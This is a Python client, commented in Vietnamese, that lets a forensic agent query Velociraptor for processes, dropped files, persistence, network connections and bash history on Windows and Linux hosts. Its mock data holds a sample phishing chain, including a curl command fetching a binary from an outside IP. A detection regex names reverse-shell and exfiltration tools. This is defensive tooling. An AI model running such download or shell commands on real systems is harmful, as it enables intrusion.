"""Velociraptor client — gRPC API wrapper với mock fallback.

Mock mode (default): trả dữ liệu giả lập có shape giống output thật, dùng để
test agent loop khi chưa có Velociraptor server.

Real mode: set env `VR_USE_REAL=1` + cung cấp `VR_API_CONFIG` (file YAML do
Velociraptor sinh: `velociraptor config api_client --name agent`).

Tham khảo: https://docs.velociraptor.app/docs/server_automation/server_api/
"""

import os
import re
import json
import logging
from typing import Optional

logger = logging.getLogger("agent.vr_client")

VR_USE_REAL = os.environ.get("VR_USE_REAL", "0") == "1"
VR_API_CONFIG = os.environ.get("VR_API_CONFIG", "/etc/velociraptor/api.config.yaml")
VR_QUERY_TIMEOUT = int(os.environ.get("VR_QUERY_TIMEOUT", "60"))
VR_CLIENT_MAP_FILE = os.environ.get(
    "VR_CLIENT_MAP_FILE",
    os.path.join(os.path.dirname(__file__), "vr_client_map.yaml"),
)

_CLIENT_MAP_CACHE: Optional[dict] = None


def _load_client_map() -> dict:
    """Đọc file YAML map hostname → Velociraptor client_id. Cache trong RAM."""
    global _CLIENT_MAP_CACHE
    if _CLIENT_MAP_CACHE is not None:
        return _CLIENT_MAP_CACHE
    if not os.path.exists(VR_CLIENT_MAP_FILE):
        _CLIENT_MAP_CACHE = {}
        return _CLIENT_MAP_CACHE
    try:
        import yaml
        with open(VR_CLIENT_MAP_FILE) as f:
            _CLIENT_MAP_CACHE = yaml.safe_load(f) or {}
    except Exception as e:
        logger.warning("Không đọc được client map %s: %s", VR_CLIENT_MAP_FILE, e)
        _CLIENT_MAP_CACHE = {}
    return _CLIENT_MAP_CACHE


def _resolve_client_id(name: str) -> str:
    """Convert hostname (vd 'WIN-01') sang Velociraptor client_id ('C.1a2b...').

    Quy tắc:
    - Nếu name đã có dạng 'C.xxx' → dùng nguyên
    - Nếu có trong client map file → trả về client_id
    - Nếu không khớp → trả về name nguyên (real mode sẽ fail có ý nghĩa)
    """
    if name.startswith("C.") and len(name) >= 10:
        return name
    mapping = _load_client_map()
    resolved = mapping.get(name)
    if not resolved:
        name_lower = name.lower()
        resolved = next(
            (client_id for host, client_id in mapping.items()
             if str(host).lower() == name_lower),
            None,
        )
    if resolved:
        return resolved
    logger.warning(
        "Không tìm thấy client_id cho host '%s' trong %s — thêm vào để Velociraptor query được",
        name, VR_CLIENT_MAP_FILE,
    )
    return name


# ── Mock data ────────────────────────────────────────────────────
# Shape khớp với output VQL thật của Velociraptor — agent học pattern từ đây
# rồi áp dụng được sang real data mà không cần đổi prompt.

_MOCK_PROCESS_TREE = {
    "target_process": {
        "pid": 4521,
        "name": "powershell.exe",
        "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": "powershell.exe -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...",
        "user": "DESKTOP-XYZ\\alice",
        "signed": True,
        "publisher": "Microsoft Windows",
        "started": "2026-05-17T10:23:45Z",
        "integrity_level": "Medium",
    },
    "parent_chain": [
        {"pid": 3120, "name": "outlook.exe",
         "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
         "signed": True, "publisher": "Microsoft Corporation",
         "note": "Outlook spawn PowerShell là pattern phishing kinh điển"},
        {"pid": 2100, "name": "explorer.exe", "signed": True,
         "publisher": "Microsoft Windows"},
    ],
    "children": [
        {"pid": 4789, "name": "curl.exe",
         "command_line": "curl http://185.220.101.47/x.bin -o C:\\Users\\Public\\xkj9.exe",
         "started": "2026-05-17T10:23:48Z", "signed": True},
        {"pid": 4801, "name": "xkj9.exe",
         "path": "C:\\Users\\Public\\xkj9.exe",
         "command_line": "C:\\Users\\Public\\xkj9.exe",
         "started": "2026-05-17T10:23:55Z",
         "signed": False,
         "note": "File mới tạo, KHÔNG có chữ ký số → highly suspicious"},
    ],
    "_mock": True,
    "_evidence_grade": "high",
    "interpretation_vi": (
        "Cây tiến trình: outlook.exe (parent) → powershell.exe (encoded) → "
        "curl.exe tải file → xkj9.exe (unsigned) chạy. Đây là kill-chain phishing "
        "→ execution → download → persistence điển hình."
    ),
}

_MOCK_FILE_ARTIFACTS = {
    "files_created_by_process": [
        {
            "path": "C:\\Users\\Public\\xkj9.exe",
            "size_bytes": 234567,
            "sha256": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
            "created": "2026-05-17T10:23:50Z",
            "signed": False,
            "interpretation_vi": "Binary unsigned dropper, đặt ở %PUBLIC% (writable cho mọi user)",
        },
        {
            "path": "C:\\Users\\alice\\AppData\\Local\\Temp\\encoded.ps1",
            "size_bytes": 8192,
            "sha256": "ff11ee22dd33cc44bb55aa6699887766554433221100ffeeddccbbaa99887766",
            "created": "2026-05-17T10:23:46Z",
            "signed": False,
            "interpretation_vi": "PowerShell script tạm, có thể là payload decode từ -EncodedCommand",
        },
    ],
    "registry_persistence": [
        {
            "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\xkj9",
            "value": "C:\\Users\\Public\\xkj9.exe",
            "type": "REG_SZ",
            "created": "2026-05-17T10:23:56Z",
            "interpretation_vi": (
                "Persistence registry — binary tự chạy mỗi khi user login. "
                "T1547.001 Registry Run Keys."
            ),
        },
    ],
    "_mock": True,
    "_evidence_grade": "high",
}

_MOCK_NETWORK = {
    "connections": [
        {
            "process": "curl.exe",
            "pid": 4789,
            "dst_ip": "185.220.101.47",
            "dst_port": 80,
            "protocol": "HTTP",
            "bytes_sent": 1234,
            "bytes_received": 234567,
            "started": "2026-05-17T10:23:49Z",
            "ip_reputation": "tor_exit_node",
            "interpretation_vi": "Tor exit node — attacker dùng anti-attribution để dropper",
        },
        {
            "process": "xkj9.exe",
            "pid": 4801,
            "dst_ip": "104.244.42.193",
            "dst_port": 443,
            "protocol": "HTTPS",
            "bytes_sent": 2456,
            "bytes_received": 8901,
            "started": "2026-05-17T10:24:01Z",
            "ip_reputation": "unknown",
            "interpretation_vi": "Beacon HTTPS sau khi dropper chạy → khả năng C2 channel",
        },
    ],
    "_mock": True,
    "_evidence_grade": "high",
}


# ── VQL queries cho real mode ────────────────────────────────────
# Khi VR_USE_REAL=1, gọi _run_vql() để execute. Các artifact dưới đây là
# built-in của Velociraptor — không cần custom.

# Pattern: collect_client → wait → source. Mỗi query ~20-30s.
# `watch_monitoring` block đảm bảo flow hoàn tất trước khi source().

_VQL_PROCESS_TREE = """
LET flow <= collect_client(client_id=ClientId,
                            artifacts=['Windows.System.Pslist'],
                            timeout=60)
SELECT * FROM foreach(
    row={SELECT * FROM watch_monitoring(artifact='System.Flow.Completion')
         WHERE FlowId = flow.flow_id LIMIT 1},
    query={SELECT Pid, Name, Exe, CommandLine, Username, Ppid,
                  Authenticode.Trusted AS Trusted,
                  Authenticode.IssuerName AS Publisher,
                  CreateTime
           FROM source(client_id=ClientId, flow_id=flow.flow_id,
                       artifact='Windows.System.Pslist')}
)
"""

_VQL_STARTUP_ITEMS = """
LET flow <= collect_client(client_id=ClientId,
                            artifacts=['Windows.Sys.StartupItems'],
                            timeout=60)
SELECT *
FROM foreach(
    row={SELECT * FROM watch_monitoring(artifact='System.Flow.Completion')
         WHERE FlowId = flow.flow_id LIMIT 1},
    query={SELECT * FROM source(client_id=ClientId, flow_id=flow.flow_id,
                                artifact='Windows.Sys.StartupItems')}
)
LIMIT 200
"""

_VQL_NEW_FILES = """
LET flow <= collect_client(client_id=ClientId,
                            artifacts=['Windows.Search.FileFinder'],
                            spec=dict(`Windows.Search.FileFinder`=dict(
                                SearchFilesGlobTable='Glob\nC:\\\\Users\\\\Public\\\\*.exe\nC:\\\\Users\\\\Public\\\\*.dll\nC:\\\\ProgramData\\\\**\\\\*.exe\nC:\\\\Windows\\\\Temp\\\\*.exe',
                                Calculate_Hash='Y'
                            )),
                            timeout=90)
SELECT * FROM foreach(
    row={SELECT * FROM watch_monitoring(artifact='System.Flow.Completion')
         WHERE FlowId = flow.flow_id LIMIT 1},
    query={SELECT OSPath AS FullPath, Size,
                  MTime AS Modified, BTime AS Created, Hash.SHA256 AS SHA256
           FROM source(client_id=ClientId, flow_id=flow.flow_id,
                       artifact='Windows.Search.FileFinder')}
)
LIMIT 100
"""

_VQL_NETSTAT = """
LET flow <= collect_client(client_id=ClientId,
                            artifacts=['Windows.Network.NetstatEnriched'],
                            timeout=60)
SELECT * FROM foreach(
    row={SELECT * FROM watch_monitoring(artifact='System.Flow.Completion')
         WHERE FlowId = flow.flow_id LIMIT 1},
    query={SELECT Pid, Name AS ProcessName, Status,
                  Laddr.IP AS LocalIP, Laddr.Port AS LocalPort,
                  Raddr.IP AS RemoteIP, Raddr.Port AS RemotePort
           FROM source(client_id=ClientId, flow_id=flow.flow_id,
                       artifact='Windows.Network.NetstatEnriched')
           WHERE Status = 'ESTABLISHED'
             AND NOT (Raddr.IP =~ '^(10\\.|192\\.168\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|127\\.|169\\.254\\.)')}
)
LIMIT 100
"""


def _run_vql(vql: str, client_id: str, env: Optional[dict] = None) -> list[dict]:
    """Execute VQL trên 1 client qua gRPC API.

    Yêu cầu: `pip install pyvelociraptor grpcio` và file `VR_API_CONFIG` hợp lệ.
    """
    try:
        from pyvelociraptor import api_pb2, api_pb2_grpc
        import grpc
        import yaml
    except ImportError as e:
        raise RuntimeError(
            "pyvelociraptor chưa cài. Chạy: pip install pyvelociraptor grpcio pyyaml"
        ) from e

    with open(VR_API_CONFIG) as f:
        config = yaml.safe_load(f)

    creds = grpc.ssl_channel_credentials(
        root_certificates=config["ca_certificate"].encode(),
        private_key=config["client_private_key"].encode(),
        certificate_chain=config["client_cert"].encode(),
    )
    # TLS server cert là "VelociraptorServer" — KHÔNG dùng config["name"] (đó là API user)
    options = (("grpc.ssl_target_name_override", "VelociraptorServer"),)

    # ClientId luôn được inject vào env để VQL không phải hardcode
    full_env = {"ClientId": client_id, **(env or {})}

    with grpc.secure_channel(config["api_connection_string"], creds, options) as channel:
        stub = api_pb2_grpc.APIStub(channel)
        req = api_pb2.VQLCollectorArgs(
            max_wait=120, max_row=1000,
            Query=[api_pb2.VQLRequest(VQL=vql, Name="agent_query")],
            env=[api_pb2.VQLEnv(key=k, value=str(v)) for k, v in full_env.items()],
        )
        rows: list[dict] = []
        try:
            for resp in stub.Query(req, timeout=VR_QUERY_TIMEOUT):
                if resp.Response:
                    data = json.loads(resp.Response)
                    if isinstance(data, list):
                        rows.extend(data)
                    else:
                        rows.append(data)
        except grpc.RpcError as e:
            logger.error("Velociraptor RPC error: %s", e)
            raise
        return rows


# ── OS detection (hỏi thẳng Velociraptor, cache theo client_id) ───
# Forensic phải đa-OS: lab có cả Windows (DESKTOP-IQAM883) lẫn Linux (WebServer
# 'ubuntu'). Query host Linux bằng VQL Windows → rỗng → grade=missing (chính là
# bug cũ). Detect OS trước rồi chọn đúng artifact.

_OS_CACHE: dict = {}
_VQL_DETECT_OS = "SELECT os_info.system AS os FROM clients(client_id=ClientId) LIMIT 1"


def _detect_os(client_id: str) -> str:
    """OS của client_id → 'windows' | 'linux' | 'darwin'. Cache RAM.

    Mặc định 'windows' khi không xác định được (giữ tương thích lab Windows cũ).
    """
    if client_id in _OS_CACHE:
        return _OS_CACHE[client_id]
    osname = "windows"
    try:
        rows = _run_vql(_VQL_DETECT_OS, client_id)
        if rows and rows[0].get("os"):
            osname = str(rows[0]["os"]).strip().lower()
    except Exception as e:
        logger.warning("Không detect được OS cho %s: %s — mặc định windows", client_id, e)
    _OS_CACHE[client_id] = osname
    return osname


# ── Helpers dựng cây tiến trình (dùng chung Windows + Linux) ──────

def _to_int(v) -> Optional[int]:
    """Ép Pid/Ppid về int. Linux.Sys.Pslist trả string ('1','0'); Windows trả int.

    Bug Linux nếu không ép: so '0' == 0 → False → children luôn rỗng.
    """
    try:
        return int(str(v).strip())
    except (ValueError, TypeError, AttributeError):
        return None


def _build_process_tree(rows: list[dict], pid) -> tuple[dict, list, list]:
    """List process phẳng → (target, parent_chain, children). Có guard chống loop."""
    pid = _to_int(pid)
    by_pid: dict[int, dict] = {}
    ppid_of: dict[int, Optional[int]] = {}
    for r in rows:
        p = _to_int(r.get("Pid"))
        if p is None:
            continue
        by_pid[p] = r
        ppid_of[p] = _to_int(r.get("Ppid"))
    if pid is None:
        return {}, [], []
    target = by_pid.get(pid, {})
    children = [by_pid[p] for p, pp in ppid_of.items() if pp == pid]
    parents: list[dict] = []
    seen: set[int] = set()
    cur = pid
    for _ in range(12):
        pp = ppid_of.get(cur)
        if pp is None or pp in seen:
            break
        seen.add(pp)
        parent = by_pid.get(pp)
        if not parent:
            break
        parents.append(parent)
        cur = pp
    return target, parents, children


def _is_external_ip(ip) -> bool:
    """True nếu IP là external (không private/loopback/link-local/wildcard)."""
    if not ip or not isinstance(ip, str):
        return False
    ip = ip.strip()
    if ip in ("", "0.0.0.0", "::", "*", "::1"):
        return False
    return not re.match(
        r"^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|127\.|169\.254\.|fe80|fc|fd)",
        ip,
    )


# ── VQL Linux (đối xứng với block Windows ở trên) ────────────────

_VQL_PROCESS_TREE_LINUX = """
LET flow <= collect_client(client_id=ClientId,
                            artifacts=['Linux.Sys.Pslist'],
                            timeout=60)
SELECT * FROM foreach(
    row={SELECT * FROM watch_monitoring(artifact='System.Flow.Completion')
         WHERE FlowId = flow.flow_id LIMIT 1},
    query={SELECT Pid, Ppid, Name, CommandLine, Exe, Username, Hash.SHA256 AS SHA256
           FROM source(client_id=ClientId, flow_id=flow.flow_id,
                       artifact='Linux.Sys.Pslist')}
)
"""

# Cột PHẲNG Laddr/Lport/Raddr/Rport/Pid/Status/ProcInfo (khác Windows lồng Laddr.IP)
# → SELECT * rồi lọc ESTABLISHED + external IP trong Python.
_VQL_NETSTAT_LINUX = """
LET flow <= collect_client(client_id=ClientId,
                            artifacts=['Linux.Network.NetstatEnriched'],
                            timeout=60)
SELECT * FROM foreach(
    row={SELECT * FROM watch_monitoring(artifact='System.Flow.Completion')
         WHERE FlowId = flow.flow_id LIMIT 1},
    query={SELECT * FROM source(client_id=ClientId, flow_id=flow.flow_id,
                                artifact='Linux.Network.NetstatEnriched')}
)
LIMIT 200
"""

# File dropper: 1 glob (SearchFilesGlob — biến thể GlobTable trả schema khác, null
# OSPath). Brace-expansion bao thư mục writable hay bị drop; leaf chỉ script/archive/
# hidden-script để giảm nhiễu (bắt cả /home/root/.adobe_update.sh qua '.*sh').
# {,*/} = 0 hoặc 1 cấp con → bounded, không treo. LocalFilesystemOnly tránh mount mạng.
_VQL_FILES_LINUX = """
LET flow <= collect_client(client_id=ClientId,
                            artifacts=['Linux.Search.FileFinder'],
                            spec=dict(`Linux.Search.FileFinder`=dict(
                                SearchFilesGlob='/{tmp,var/tmp,dev/shm,root,home/*}/{,*/}{.*sh,.*py,.*sh.*,*.sh,*.py,*.elf,*.bin,*.tar.gz,*.gz,*.tgz}',
                                Calculate_Hash='Y',
                                LocalFilesystemOnly='Y'
                            )),
                            timeout=120)
SELECT * FROM foreach(
    row={SELECT * FROM watch_monitoring(artifact='System.Flow.Completion')
         WHERE FlowId = flow.flow_id LIMIT 1},
    query={SELECT OSPath AS FullPath, Size, MTime AS Modified, Hash.SHA256 AS SHA256
           FROM source(client_id=ClientId, flow_id=flow.flow_id,
                       artifact='Linux.Search.FileFinder')}
)
LIMIT 200
"""

# Persistence: crontab (demo cài cron gọi .adobe_update.sh). Cột: User, Command, Path.
_VQL_CRONTAB_LINUX = """
LET flow <= collect_client(client_id=ClientId,
                            artifacts=['Linux.Sys.Crontab'],
                            timeout=60)
SELECT 'cron' AS Source, User, Command, Path AS Location
FROM foreach(
    row={SELECT * FROM watch_monitoring(artifact='System.Flow.Completion')
         WHERE FlowId = flow.flow_id LIMIT 1},
    query={SELECT User, Command, Path
           FROM source(client_id=ClientId, flow_id=flow.flow_id,
                       artifact='Linux.Sys.Crontab')}
)
LIMIT 200
"""

# Lịch sử lệnh: bash history. Cột: Line, OSPath. (Lệnh chạy non-interactive qua
# script .sh sẽ KHÔNG ở đây — nguồn đầy đủ là index auditd trong ES.)
_VQL_BASH_HISTORY_LINUX = """
LET flow <= collect_client(client_id=ClientId,
                            artifacts=['Linux.Sys.BashHistory'],
                            timeout=60)
SELECT Line, OSPath AS HistoryFile
FROM foreach(
    row={SELECT * FROM watch_monitoring(artifact='System.Flow.Completion')
         WHERE FlowId = flow.flow_id LIMIT 1},
    query={SELECT Line, OSPath
           FROM source(client_id=ClientId, flow_id=flow.flow_id,
                       artifact='Linux.Sys.BashHistory')}
)
LIMIT 500
"""

# Heuristic: lệnh shell đáng ngờ (download / exfil / persistence / encoding).
_SUSPICIOUS_CMD_RE = re.compile(
    r"\b(curl|wget|nc|ncat|base64|openssl\s+enc|tar\s+|gzip|xxd|"
    r"crontab|systemctl|chmod\s+\+x|/dev/tcp/|/dev/shm/|"
    r"\.adobe|exfil|reverse|payload|mkfifo|bash\s+-i)\b",
    re.IGNORECASE,
)


def _filter_suspicious_bash(rows: list[dict]) -> list[dict]:
    return [r for r in rows
            if r.get("Line") and _SUSPICIOUS_CMD_RE.search(str(r["Line"]))]


# ── Linux query helpers ──────────────────────────────────────────

def _linux_file_artifacts(client_id: str) -> dict:
    """File dropper + cron persistence + bash history trên host Linux.

    PID-independent → vẫn lấy được bằng chứng kể cả khi tiến trình tấn công đã thoát
    (bằng chứng còn trên đĩa). Đây là cách lật grade từ 'missing' về thật cho alert cũ.
    """
    files: list[dict] = []
    persistence: list[dict] = []
    command_history: list[dict] = []
    errors: list[str] = []

    try:
        raw_files = _run_vql(_VQL_FILES_LINUX, client_id)
        # Dedupe theo path (brace-glob '{,*/}' có thể match trùng 1 file)
        seen_paths: set = set()
        for f in raw_files:
            p = f.get("FullPath")
            if p and p not in seen_paths:
                seen_paths.add(p)
                files.append(f)
    except Exception as e:
        logger.warning("Linux file query failed: %s", e)
        errors.append(f"file_query: {e}")
    try:
        persistence = _run_vql(_VQL_CRONTAB_LINUX, client_id)
    except Exception as e:
        logger.warning("Linux crontab query failed: %s", e)
        errors.append(f"crontab_query: {e}")
    try:
        command_history = _filter_suspicious_bash(_run_vql(_VQL_BASH_HISTORY_LINUX, client_id))
    except Exception as e:
        logger.warning("Linux bash history query failed: %s", e)
        errors.append(f"bash_query: {e}")

    has_evidence = bool(files or persistence or command_history)
    grade = "high" if has_evidence else "low"
    if errors and not has_evidence:
        grade = "missing"

    return {
        "os": "linux",
        "files_dropped": files,
        "persistence": persistence,            # cron entries (User/Command/Location)
        "command_history": command_history,    # bash history đáng ngờ
        "_evidence_grade": grade,
        **({"_query_errors": errors} if errors else {}),
    }


def _linux_network(client_id: str) -> dict:
    """Kết nối external đang active trên host Linux (ESTABLISHED, non-private remote)."""
    try:
        rows = _run_vql(_VQL_NETSTAT_LINUX, client_id)
    except Exception as e:
        logger.warning("Velociraptor query failed (linux netstat): %s", e)
        return {"os": "linux", "connections": [], "_evidence_grade": "missing",
                "_real_query_failed": str(e)}
    conns: list[dict] = []
    for r in rows:
        if str(r.get("Status", "")).upper() != "ESTABLISHED":
            continue
        raddr = r.get("Raddr")
        if not _is_external_ip(raddr):
            continue
        proc = r.get("ProcInfo") or {}
        conns.append({
            "process": proc.get("Name") or r.get("Name"),
            "pid": r.get("Pid") or proc.get("Pid"),
            "command_line": proc.get("CommandLine"),
            "local": f"{r.get('Laddr')}:{r.get('Lport')}",
            "remote_ip": raddr,
            "remote_port": r.get("Rport"),
            "status": r.get("Status"),
        })
    return {"os": "linux", "connections": conns,
            "_evidence_grade": "high" if conns else "low"}


# ── Public API — gọi từ tools.py ─────────────────────────────────

def get_process_tree_deep(client_id: str, pid: int) -> dict:
    """Lấy cây tiến trình sâu (parent chain + children + ký số/hash) từ host thật.

    OS-aware: Windows → Windows.System.Pslist; Linux → Linux.Sys.Pslist.
    """
    if not VR_USE_REAL:
        return _MOCK_PROCESS_TREE

    client_id = _resolve_client_id(client_id)
    osname = _detect_os(client_id)
    vql = _VQL_PROCESS_TREE_LINUX if osname == "linux" else _VQL_PROCESS_TREE
    try:
        rows = _run_vql(vql, client_id)
        target, parents, children = _build_process_tree(rows, pid)
        result = {
            "os": osname,
            "target_process": target,
            "parent_chain": parents,
            "children": children,
            "total_procs_scanned": len(rows),
            "_evidence_grade": "high" if target else ("low" if rows else "missing"),
        }
        if rows and not target:
            result["_note_vi"] = (
                f"PID {pid} không còn trong process list (tiến trình đã thoát). "
                "Host vẫn online — gọi vr_file_artifacts để lấy bằng chứng còn trên đĩa "
                "(file dropper, cron persistence, lịch sử lệnh)."
            )
        return result
    except Exception as e:
        logger.warning("Velociraptor query failed (process tree, os=%s): %s", osname, e)
        return {
            "os": osname,
            "target_process": {},
            "parent_chain": [],
            "children": [],
            "total_procs_scanned": 0,
            "_evidence_grade": "missing",
            "_real_query_failed": str(e),
        }


def get_file_artifacts(client_id: str, since_minutes: int = 30) -> dict:
    """Lấy file mới tạo + registry persistence từ host thật.

    Gọi 2 VQL artifact:
    - Windows.Search.FileFinder: file .exe/.dll trong C:\\Users\\Public, ProgramData, Temp
    - Windows.Sys.StartupItems: Run keys + Startup folder items
    """
    if not VR_USE_REAL:
        return _MOCK_FILE_ARTIFACTS

    client_id = _resolve_client_id(client_id)
    if _detect_os(client_id) == "linux":
        return _linux_file_artifacts(client_id)

    files: list[dict] = []
    persistence: list[dict] = []
    errors: list[str] = []

    try:
        files = _run_vql(_VQL_NEW_FILES, client_id)
    except Exception as e:
        logger.warning("Velociraptor file query failed: %s", e)
        errors.append(f"file_query: {e}")

    try:
        persistence_raw = _run_vql(_VQL_STARTUP_ITEMS, client_id)
        # Lọc Run keys có dấu hiệu suspicious (path Users\Public, Temp, ProgramData)
        # Velociraptor StartupItems field: Details = path/command, OSPath = registry key location
        SUSPICIOUS_PATH_SUBSTRINGS = (
            "users\\public", "appdata\\local\\temp", "appdata\\roaming",
            "programdata", "windows\\temp", "\\downloads\\",
        )
        persistence = [
            p for p in persistence_raw
            if p.get("Details") and
               any(s in str(p.get("Details", "")).lower()
                   for s in SUSPICIOUS_PATH_SUBSTRINGS)
        ]
    except Exception as e:
        logger.warning("Velociraptor startup query failed: %s", e)
        errors.append(f"startup_query: {e}")

    grade = "high" if (files or persistence) else "low"
    if errors and not files and not persistence:
        grade = "missing"

    return {
        "files_created_by_process": files,
        "registry_persistence": persistence,
        "_evidence_grade": grade,
        **({"_query_errors": errors} if errors else {}),
    }


def get_network_connections_deep(client_id: str, since_minutes: int = 30) -> dict:
    """Lấy kết nối mạng đang active trên host thật (chỉ external IP)."""
    if not VR_USE_REAL:
        return _MOCK_NETWORK

    client_id = _resolve_client_id(client_id)
    if _detect_os(client_id) == "linux":
        return _linux_network(client_id)

    try:
        rows = _run_vql(_VQL_NETSTAT, client_id, env={"SinceMinutes": since_minutes})
        return {"connections": rows, "_evidence_grade": "high" if rows else "low"}
    except Exception as e:
        logger.warning("Velociraptor query failed (netstat): %s", e)
        return {
            "connections": [],
            "_evidence_grade": "missing",
            "_real_query_failed": str(e),
        }
